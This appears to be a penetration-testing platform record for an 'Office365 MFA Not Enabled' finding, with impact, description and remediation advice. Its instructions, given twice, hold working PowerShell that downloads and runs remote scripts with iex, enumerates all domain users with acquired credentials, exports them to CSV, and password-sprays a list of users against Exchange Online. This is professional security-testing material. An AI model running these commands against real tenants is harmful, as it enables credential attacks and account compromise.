{"default_url":null,"content":{"state":3,"taskInstructions":"<h2>Instructions</h2><br>Attempt to login to O365 endpoints and determine if MFA is enabled.<br><br>Below are some notes for grabbing a list of domain users and other information via ADFS using acquired credentials if multi-factor authentication (MAL) has not been enabled in Azure/Office365 environments.<br><br><h3>Install Apps</h3><br>1. Download and install visual studio 10<br><br>2. Downoad and install the Lync SDK<br><code>https://www.microsoft.com/en-us/download/details.aspx?id=36824<br></code><br>3. Download and install Microsoft Online Services Sign-In Assistant for IT Professionals RTW<br><code>http://go.microsoft.com/fwlink/?LinkID=286152<br></code><br>4. Download and Install the Azure Active Directory Module for Windows PowerShell (64-bit version)<br><code>http://go.microsoft.com/fwlink/p/?linkid=236297<br></code><br>5. Import the scripts<br><code>git clone https://github.com/NetSPI/PowerShell<br>import-module PowerSkype.ps1<br>import-module Get-FederationEndpoint.ps1<br></code><br>OR<br><code>iex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)<br>iex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/PowerSkype.ps1&quot;)<br></code><br><h3>Fingerprint Federated and Managed Domains</h3><br>Summary:<br><ul><li>managed = in ms cloud</li><br><li>federated = internally hosted</li><br></ul><br>1. Check if domain email is managed or federated.<br><code>Get-FederationEndpoint -domain domain.com<br>Email     : username@domain.com<br>Type      : Federated<br>Domain    : domain.com<br>BrandName : domain.com<br>AuthURL   : https://idp.domain.com/idp/profile/SAML2/POST/SSO<br></code><br>2. Check if domain is managed or federated<br><code>Get-SkypeFederation -domain domain.com<br>Domain                 : domain.com<br>MS=MS&#42;                 : True<br>_sip._tcp              : True<br>_sip._tls              : False<br>_sipfederationtls._tcp : False<br></code><br>3. Get skype status<br><code>Get-SkypeStatus -email username@domain.com<br></code><br><h3>Information Gathering for Managed Domains</h3><br><ol><li>Get list of emails for azure services - must be managed domain</li><br><li>Reference: https://msdn.microsoft.com/en-us/library/azure/dn194123(v=azure.98).aspx</li><br><li>Reference: https://msdn.microsoft.com/en-us/library/azure/jj151815(v=azure.98).aspx</li><br><li>See references for other command examples</li><br><li>Get Domain Users</li><br></ol><br><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord<br>connect-msolservice -credential $credentials<br>Get-MsolDomain<br>Get-MsolUser<br></code><br><h3>Information Gathering for federated Domains</h3><br><ol><li>Get Domain Users</li><br></ol><br><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord<br>New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection<br>Get-PSSession<br>Id Name            ComputerName    State         ConfigurationName     Availability<br>-- ----            ------------    -----         -----------------     ------------<br>2 Session2         outlook.offi... Opened        Microsoft.Exchange       Available<br>Enter-PSSession 2<br>Get-Command | Select-Object Name<br></code><br><h3>Execute a single command and store results to excel file and get domain user information</h3><br><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord<br>Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {Get-Recipient -ResultSize unlimited} | Export-CSV c:\\temp\\domain_users.csv -NoTypeInformation<br></code><br><ol><li>Super slow / dirty dictionary attack option</li><br></ol><br><code>$Users = Get-Content C:\\temp\\users.txt<br>$Password = &quot;Password&quot;<br>$Users |<br>ForEach-Object {<br>Write-Output &quot;Testing $Password on $_&quot;<br>$PWord = ConvertTo-SecureString -String &quot;$Password&quot; -AsPlainText -Force<br>$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;$_&quot;, $PWord<br>Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name}<br>}<br></code><br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":17059065,"exploitInstructions":"Enumerate domain users and conduct dictionary attacks<br>Log into azure environment and access the servers and data","verificationInstructions":"<br>Below are some notes for grabbing a list of domain users and other information via ADFS using acquired credentials if multi-factor authentication (MAL) has not been enabled in Azure/Office365 environments.<br><br>Install Apps<br><br>Download and install visual studio 10<br><br>Downoad and install the Lync SDK<br>https://www.microsoft.com/en-us/download/details.aspx?id=36824<br><br>Download and install Microsoft Online Services Sign-In Assistant for IT Professionals RTW <br>http://go.microsoft.com/fwlink/?LinkID=286152<br><br>Download and Install the Azure Active Directory Module for Windows PowerShell (64-bit version)<br>http://go.microsoft.com/fwlink/p/?linkid=236297<br><br><br>Import the scripts<br><br>git clone https://github.com/NetSPI/PowerShell<br><br>import-module PowerSkype.ps1<br>import-module Get-FederationEndpoint.ps1<br><br>or <br><br>iex(New-Object net.webclient).DownloadString(\"https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1\")<br>iex(New-Object net.webclient).DownloadString(\"https://raw.githubusercontent.com/NetSPI/PowerShell/master/PowerSkype.ps1\")<br><br><br>Fingerprint Federate and Managed Domains<br><br>1. Summary: managed = in ms cloud; federated = internally hosted<br><br>2. Check if domain email is managed or federated<br><br>Get-FederationEndpoint -domain domain.com<br><br>Email     : username@domain.com<br>Type      : Federated<br>Domain    : domain.com<br>BrandName : domain.com<br>AuthURL   : https://idp.domain.com/idp/profile/SAML2/POST/SSO<br><br><br>1. Check if domain is managed or federated<br><br>Get-SkypeFederation -domain domain.com<br><br>Domain                 : domain.com<br>MS=MS&#42;                 : True<br>_sip._tcp              : True<br>_sip._tls              : False<br>_sipfederationtls._tcp : False<br><br>1. Get skype status<br><br>Get-SkypeStatus -email username@domain.com<br><br><br>Information Gathering for Managed Domains<br><br><ol><li>Get list of emails for azure services - must be managed domain</li><br><li>Reference: https://msdn.microsoft.com/en-us/library/azure/dn194123(v=azure.98).aspx</li><br><li>Reference: https://msdn.microsoft.com/en-us/library/azure/jj151815(v=azure.98).aspx</li><br><li>See references for other command examples</li><br><li>Get Domain Users</li><br></ol><br>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord<br>connect-msolservice -credential $credentials<br>Get-MsolDomain<br>Get-MsolUser<br><br><br>Information Gathering for federated Domains<br><br><ol><li>Get Domain Users</li><br></ol><br>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord<br>New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection<br>Get-PSSession<br><br> Id Name            ComputerName    State         ConfigurationName     Availability<br> -- ----            ------------    -----         -----------------     ------------<br>  2 Session2        outlook.offi... Opened        Microsoft.Exchange       Available<br><br>Enter-PSSession 2<br>Get-Command | Select-Object Name<br><br>Execute a single command and store results to excel file - get domain user information<br><br>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force<br>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord<br>Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {Get-Recipient -ResultSize unlimited} | Export-CSV c:\\temp\\domain_users.csv -NoTypeInformation<br><br><ol><li>Super slow / dirty dictionary attack option</li><br></ol><br>$Users = Get-Content C:\\temp\\users.txt<br>$Password = \"Password\"<br>$Users | <br>ForEach-Object {<br>    Write-Output \"Testing $Password on $_\"<br><br>    $PWord = ConvertTo-SecureString -String \"$Password\" -AsPlainText -Force<br>    $credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"$_\", $PWord<br>    Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name} <br>}<br>","remediationInstructions":"Consider requiring multi-factor authentication for Azure and Office 365 accounts to help prevent unauthorized access to sensitive systems, applications, email, and sensitive data.<br>","name":"Remote Management Interface - Office365 - MFA Not Enabled","sourceId":"M:0bfc36e9-396d-e611-80e5-ecf4bbd04083","severity":"Medium","businessImpact":"If an Azure or Office365 account is compromised, an attacker may be able to gain unauthorized access to systems, applications, email, and sensitive information from the internet without having authenticate using a second factor.","description":"Multi-factor Authentication (MFA) was not enabled for Office 365 users.<br><br>Microsoft states that \"Azure multi-factor authentication is a method of verifying who you are that requires the use of more than just a username and password. Using MFA for Office 365, users are required to acknowledge a phone call, text message, or app notification on their smart phones after correctly entering their passwords. They can sign in only after this second authentication factor has been satisfied. \"<br><br>Note: A form of multi-factor authentication is included with Office 365, but you can also purchase Azure multi-factor authentication that includes extended functionality.<br>"}}}